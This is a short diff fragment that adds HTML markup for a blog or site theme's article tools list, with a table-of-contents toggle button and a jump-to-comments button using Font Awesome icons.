+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
 	
 
 	<div class="right-side-tools-container">
